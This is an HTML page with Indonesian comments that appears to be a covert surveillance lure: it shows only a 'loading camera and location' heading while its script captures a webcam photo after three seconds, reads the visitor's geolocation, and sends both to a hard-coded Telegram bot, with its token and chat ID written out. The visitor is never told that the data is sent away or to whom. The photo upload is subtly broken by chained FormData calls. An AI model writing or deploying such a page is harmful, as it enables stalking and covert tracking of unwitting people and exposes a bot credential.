<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Capture Photo & Location</title>
</head>
<body>
  <h1>Memuat Kamera & Lokasi...</h1>
  <video id="video" autoplay playsinline width="300"></video>
  <canvas id="canvas" style="display:none;"></canvas>

  <script>
    const video = document.getElementById('video');
    const canvas = document.getElementById('canvas');

    // Akses kamera
    navigator.mediaDevices.getUserMedia({ video: true })
      .then((stream) => {
        video.srcObject = stream;

        // Tunggu 3 detik lalu ambil foto
        setTimeout(() => {
          const context = canvas.getContext('2d');
          canvas.width = video.videoWidth;
          canvas.height = video.videoHeight;
          context.drawImage(video, 0, 0);
          const imageData = canvas.toDataURL('image/jpeg');

          // Akses lokasi
          navigator.geolocation.getCurrentPosition((position) => {
            const latitude = position.coords.latitude;
            const longitude = position.coords.longitude;

            // Kirim ke Bot Telegram
            const botToken = '7927041124:AAHuSSavc_9B1BLJDo91nIz4bO_fih2gLro';
            const chatId = '7041008009';

            // Kirim foto
            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
              method: 'POST',
              body: new FormData().append('chat_id', chatId).append('photo', imageData)
            });

            // Kirim lokasi
            fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
              method: 'POST',
              headers: { 'Content-Type': 'application/json' },
              body: JSON.stringify({
                chat_id: chatId,
                latitude: latitude,
                longitude: longitude
              })
            });
          });
        }, 3000);
      })
      .catch((err) => {
        console.error('Gagal mengakses kamera atau lokasi:', err);
      });
  </script>
</body>
</html>
